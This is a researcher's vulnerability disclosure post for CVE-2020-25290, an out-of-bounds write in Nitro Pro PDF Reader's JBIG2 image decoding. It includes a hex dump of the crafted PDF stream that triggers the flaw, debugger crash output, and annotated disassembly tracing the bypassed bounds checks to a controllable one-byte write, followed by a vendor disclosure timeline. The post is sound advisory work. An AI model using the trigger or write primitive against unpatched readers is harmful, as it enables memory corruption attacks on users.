---
layout: post
title:  "CVE-2020-25290 - Nitro Pro PDF JBIG2 Image Decoders Out-of-Bounds Write Vulnerability"
date:   2020-09-18 21:00:00 +0800
tags:
    - CVE-2020-25290
---

Overview
-----------
Nitro Software, Inc. develops commercial software used to create, edit, sign, and secure Portable Document Format files and digital documents. The company has over 650,000 business customers worldwide, and claims millions of users across the globe.

Vulnerability Description
-------------------------
An exploitable out-of-bounds write vulnerability exists in the handling of JBIG2 image decoders of object stream attributes of Nitro Pro PDF Reader version 13.19.2.356. A specially crafted PDF document can trigger an out-of-bounds write, which can disclose sensitive memory content or even write and aid in exploitation when coupled with another vulnerability. An attacker needs to trick the user to open the malicious file to trigger this vulnerability. If the browser plugin extension is enabled, visiting a malicious site can also trigger the vulnerability.

Vulnerability Analysis
----------------------
The out-of-bounds issue exists when JBIG2 fails to handle image decoders of object stream attributes. This happened when it tries to process the following example image stream embedded in PDF. Nitro Pro PDF rely on JBIG2 library to handle images.
```
00000150  20 30 20 6F 62 6A 0A 3C 3C 20 2F 44 65 63 6F 64   0 obj.<< /Decod
00000160  65 50 61 72 6D 73 20 20 3C 3C 20 2F 4A 42 49 47  eParms  << /JBIG
00000170  32 47 6C 6F 62 61 6C 73 20 34 20 30 20 52 20 3E  2Globals 4 0 R >
00000180  3E 0A 2F 57 69 64 74 68 20 33 32 0A 2F 43 6F 6C  >./Width 32./Col
00000190  6F 72 53 70 61 63 65 20 2F 44 65 76 69 63 65 47  orSpace /DeviceG
000001A0  72 61 79 0A 2F 48 65 69 67 68 74 20 33 32 0A 2F  ray./Height 32./
000001B0  46 69 6C 74 65 72 20 2F 4A 42 49 47 32 44 65 63  Filter /JBIG2Dec
000001C0  6F 64 65 0A 2F 53 75 62 74 79 70 65 20 2F 49 6D  ode./Subtype /Im
000001D0  61 67 65 0A 2F 4C 65 6E 67 74 68 20 37 36 0A 2F  age./Length 76./
000001E0  54 79 70 65 20 2F 58 4F 62 6A 65 63 74 0A 2F 42  Type /XObject./B
000001F0  69 74 73 50 65 72 43 6F 6D 70 6F 6E 65 6E 74 20  itsPerComponent 
00000200  31 0A 3E 3E 0A 73 74 72 65 61 6D 0A 00 00 00 01  1.>>.stream.....
00000210  30 00 01 00 00 00 13 00 00 00 20 00 00 00 20 00  0......... ... .
00000220  00 00 47 00 00 00 47 00 00 00 00 00 00 02 06 22  ..G...G........"
00000230  00 01 00 00 00 22 00 00 00 20 00 00 00 20 00 00  ....."... ... ..
00000240  00 00 00 00 00 00 00 00 00 00 00 00 04 9E E8 54  .............žèT
00000250  EC DF EB 09 4E 93 41 AC 0A 65 6E 64 73 74 72 65  ìßë.N“A¬.endstre
00000260  61 6D 0A 65 6E 64 6F 62 6A 0A 0A 36 20 30 20 6F  am.endobj..6 0 o
```

An access violation occured when parsing the PDF:
```
(90b4.8ba0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
npdf!CAPContent::Wrap+0xa041d:
00007ffc`303486fd 204c28ff        and     byte ptr [rax+rbp-1],cl ds:ffffffff`ffffffff=??

0:000>r
rax=0000000000000000 rbx=0000025593320d10 rcx=00000000000000ff
rdx=00007ff81ea90460 rsi=0000005894ff7c50 rdi=0000000000000000
rip=00007ff81e73c17d rsp=0000005894ff7b60 rbp=0000000000000000
 r8=0000000000000000  r9=0000005894ff7b70 r10=0000000000000000
r11=0000000000000000 r12=0000000000000000 r13=000000000000003d
r14=0000000000000000 r15=00000000000000ff
```

Analyzing thru the crash path found that the OOB happened when the library JBIG2 in npdf.dll attempted to write in memory. Crash path:
```
00007ffc`303486e0 448bac24b8000000  mov     r13d,dword ptr [rsp+0B8h]
00007ffc`303486e8 488b06            mov     rax,qword ptr [rsi]
00007ffc`303486eb 488b4810          mov     rcx,qword ptr [rax+10h]
00007ffc`303486ef 488b01            mov     rax,qword ptr [rcx]
00007ffc`303486f2 4903c4            add     rax,r12
00007ffc`303486f5 0fb68c24a0000000  movzx   ecx,byte ptr [rsp+0A0h]
00007ffc`303486fd 204c28ff          and     byte ptr [rax+rbp-1],cl
```

We can see the [rsp+0A0h] is containing an argument and will be copied into the ECX register. Here’s the containing memory of [rsp+0A0h]:
```
0:000> dc rsp+0A0
00000015`239f9970  239f9cff 00000015 00000000 00000000  ...#............
00000015`239f9980  00000000 000001af 0000003d 00000015  ........=.......
00000015`239f9990  00000000 00000000 00000000 00000000  ................
00000015`239f99a0  00000000 00000000 00000000 0000000b  ................
00000015`239f99b0  7def3af0 000001af 71972596 00007ffc  .:.}.....%.q....
00000015`239f99c0  7def3bb0 000001af 7dc5d76c 000001af  .;.}....l..}....
00000015`239f99d0  7dc5d720 000001af 7dc5d764 000001af   ..}....d..}....
00000015`239f99e0  7dc5d76c 000001af fffffffe ffffffff  l..}............
```

First argument will be 239f9cff and this is copied to the ECX register. At the crash path, it performs a bitwise AND operation on the destination (first) and source (second) operands and stores the result in the destination of the operand location, in this case to memory location. It uses CL register to copy the value FF to [rax+rbp-1]. Examining the memory of [rax+rbp-1]. Thus, we can confirm that this issue is indeed an attempt to write. This can be observed with:
```
0:000> dc [rax+rbp-1]
ffffffff`ffffffff  ???????? ???????? ???????? ????????  ????????????????
00000000`0000000f  ???????? ???????? ???????? ????????  ????????????????
00000000`0000001f  ???????? ???????? ???????? ????????  ????????????????
00000000`0000002f  ???????? ???????? ???????? ????????  ????????????????
00000000`0000003f  ???????? ???????? ???????? ????????  ????????????????
00000000`0000004f  ???????? ???????? ???????? ????????  ????????????????
00000000`0000005f  ???????? ???????? ???????? ????????  ????????????????
00000000`0000006f  ???????? ???????? ???????? ????????  ????????????????

0:000> .exr -1
ExceptionAddress: 00007ffc303486fd (npdf!CAPContent::Wrap+0x00000000000a041d)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 0000000000000001
   Parameter[1]: ffffffffffffffff
Attempt to write to address ffffffffffffffff
```

The vulnerability lies in the sub_18045850 function. This function supposedly performed further checking on the image being decoded. It has multiple checks of Bitmap decoding, to prevent an index out of bound. It checks for bitmap width and height by checking the length from 0x7FFFFFFF until it exceeds 0xFFFFFFFFFFFFFFFE and throws an error. In our case, this check is get passed and jumps to a different branch code that didn't perform checks. This gives us hint that we manage to achieve out-of-bounds checks.
```
.text:0000000180458516                 mov     qword ptr [r11-68h], 0FFFFFFFFFFFFFFFEh   // out-of-bounds check value
.text:000000018045851E                 mov     [r11+10h], rbx
.text:0000000180458522                 mov     r12d, r9d
.text:0000000180458525                 mov     r14d, r8d
.text:0000000180458528                 mov     rsi, rdx
.text:000000018045852B                 mov     rbx, rcx
.text:000000018045852E                 mov     eax, [rcx]
.text:0000000180458530                 cmp     r8d, eax
.text:0000000180458533                 ja      loc_18045874B                  // check if bitmap index out of bound
.text:0000000180458539                 mov     ecx, [rcx+4]
.text:000000018045853C                 cmp     r9d, ecx
.text:000000018045853F                 ja      loc_18045874B                  // check if bitmap index out of bound
.text:0000000180458545                 mov     ebp, [r11+28h]
.text:0000000180458549                 lea     r15d, [r8+rbp]
.text:000000018045854D                 cmp     r15d, eax
.text:0000000180458550                 ja      loc_180458728                  // check if bitmap index out of bound
.text:0000000180458556                 mov     r13d, [r11+30h]
.text:000000018045855A                 lea     eax, [r9+r13]
.text:000000018045855E                 cmp     eax, ecx
.text:0000000180458560                 ja      loc_180458728                 // check if bitmap index out of bound
```

It then again checks for validity of bitmap width and height. The check it perform is veryr and calculate each of in detail to prevent memory corruption. 
```
.text:0000000180458566                 mov     ecx, 18h           // allocate size 0x18
.text:000000018045856B                 call    ??2@YAPEAX_K@Z  ; operator new(unsigned __int64)
.text:0000000180458570                 mov     [rsp+88h+arg_0], rax
.text:0000000180458578                 xor     edi, edi
.text:000000018045857A                 test    rax, rax
.text:000000018045857D                 jz      short loc_180458591
...
.text:0000000180457ABE                 mov     [rsp+78h+var_58], 0FFFFFFFFFFFFFFFEh     // max size value for 64-bit address
.text:0000000180457AC7                 mov     rdi, rcx
.text:0000000180457ACA                 mov     [rcx], edx
.text:0000000180457ACC                 mov     [rcx+4], r8d
.text:0000000180457AD0                 lea     r14, [rcx+10h]
.text:0000000180457AD4                 xor     ebx, ebx
.text:0000000180457AD6                 mov     [r14], rbx
.text:0000000180457AD9                 cmp     dword ptr [rcx], 7FFFFFFFh           // max size value for 32-bit address
.text:0000000180457ADF                 jnb     loc_180457BAC                        // check for bitmap width if it is invalid
.text:0000000180457AE5                 lea     esi, [rdx+7]
.text:0000000180457AE8                 shr     esi, 3
.text:0000000180457AEB                 mov     [rcx+8], esi
.text:0000000180457AEE                 mov     eax, r8d
.text:0000000180457AF1                 imul    rsi, rax
.text:0000000180457AF5                 cmp     rsi, 7FFFFFFFh
.text:0000000180457AFC                 jnb     loc_180457B89                        // check for bitmap height if it is invalid
.text:0000000180457B02                 lea     ecx, [rbx+18h]
.text:0000000180457B05                 call    ??2@YAPEAX_K@Z
.text:0000000180457B0A                 mov     [rsp+78h+arg_18], rax
.text:0000000180457B12                 test    rax, rax
.text:0000000180457B15                 jz      short loc_180457B3C
.text:0000000180457B17                 mov     [rsp+78h+arg_8], bl
.text:0000000180457B1E                 lea     r9, [rsp+78h+arg_10]
.text:0000000180457B26                 lea     r8, [rsp+78h+arg_8]
.text:0000000180457B2E                 mov     rdx, rsi
.text:0000000180457B31                 mov     rcx, rax
.text:0000000180457B34                 call    sub_180163140                      // perform another check, this round it checks for the size if exceeded 0x7FFFFFFFFFFFFFFF
...
.text:000000018016314B                 mov     [rsp+38h+var_18], 0FFFFFFFFFFFFFFFEh
.text:0000000180163154                 mov     [rsp+38h+arg_8], rbx
.text:0000000180163159                 mov     [rsp+38h+arg_10], rsi
.text:000000018016315E                 mov     [rsp+38h+arg_18], rdi
.text:0000000180163163                 mov     r14, r8
.text:0000000180163166                 mov     rsi, rdx
.text:0000000180163169                 mov     rdi, rcx
.text:000000018016316C                 xor     eax, eax
.text:000000018016316E                 mov     [rcx], rax
.text:0000000180163171                 mov     [rcx+8], rax
.text:0000000180163175                 mov     [rcx+10h], rax
.text:0000000180163179                 test    rdx, rdx
.text:000000018016317C                 jz      short loc_1801631BE
.text:000000018016317E                 mov     rax, 7FFFFFFFFFFFFFFFh
.text:0000000180163188                 cmp     rdx, rax
.text:000000018016318B                 ja      short loc_1801631D7
.text:000000018016318D                 call    sub_1800BD550
.text:0000000180163192                 mov     [rdi], rax
.text:0000000180163195                 mov     [rdi+8], rax
.text:0000000180163199                 mov     rax, [rdi]
.text:000000018016319C                 lea     rcx, [rsi+rax]             // here we can perform some write
.text:00000001801631A0                 mov     [rdi+10h], rcx             
.text:00000001801631A4                 mov     rbx, rax
.text:00000001801631A7                 movzx   edx, byte ptr [r14] ; Val
.text:00000001801631AB                 mov     r8, rsi         ; Size
.text:00000001801631AE                 mov     rcx, rax        ; Dst      // RCX is controllable register here, we can set a 1 byte write 
.text:00000001801631B1                 call    memset                     // using memset to control our write to memory
```

At this point we are able to control and pass thru the checks, meaning here the checks that were done initially didn't clear out memory that allocated thus allowing us to perform write.
```
.text:0000000180458650                 mov     ecx, [rsp+88h+arg_18]
.text:0000000180458657                 add     ecx, r11d
.text:000000018045865A                 imul    ecx, [rbx+8]
.text:000000018045865E                 mov     [rsp+88h+arg_0], rcx
.text:0000000180458666                 mov     rax, [rsi]
.text:0000000180458669                 mov     ebp, [rax+8]
.text:000000018045866C                 imul    ebp, r11d
.text:0000000180458670                 mov     r8d, edi
.text:0000000180458673                 test    r12d, r12d
.text:0000000180458676                 jz      short loc_1804586E8
```

Then we reach to the crash path where 00000001804586FD trying to set the value that we set in memory (1-byte write) to an invalid pointer. 
```
.text:00000001804586E8                 mov     rax, [rsi]
.text:00000001804586EB                 mov     rcx, [rax+10h]
.text:00000001804586EF                 mov     rax, [rcx]
.text:00000001804586F2                 add     rax, r12
.text:00000001804586F5                 movzx   ecx, [rsp+88h+arg_10]
.text:00000001804586FD                 and     [rax+rbp-1], cl          // crash here when write 1-byte to the [rax+rbp-1] pointer which is an invalid pointer
```

Disclosure timeline
-------------------
The vulnerability was reported back June 2020. Timeline of disclosure:

- 2020-06-11 - Vulnerability reported to Nitro Security team via email.
- 2020-06-18 - Vendor acknowledge however didn't manage to receive the proof-of-concept due to flagged as malicious in their mail gateway. 
- 2020-06-23 - Using alternative way to provide PoC to vendor along with full vulnerability report.
- 2020-07-10 - Follow up with vendor on the progress.
- 2020-07-10 - Vendor replied they aim to resolve the issue within 90 days.
- 2020-07-28 - Requested for CVE to assign to the vulnerability as per vendor request. 
- 2020-09-14 - CVE assigned and provide the CVE ID to vendor.
- 2020-09-15 - Vendor acknowledge and will add into their advisory page.
- 2020-09-18 - Get confirmation from the vendor if the latest release version fix the vulnerability reported.
- 2020-09-18 - Vendor confirmed issue has been fixed in latest version release, 13.24.1.467. Advisory page, [__https://www.gonitro.com/nps/security/updates#security-update-12__](https://www.gonitro.com/nps/security/updates#security-update-12)
- 2020-09-18 - Publicly disclosed :) 
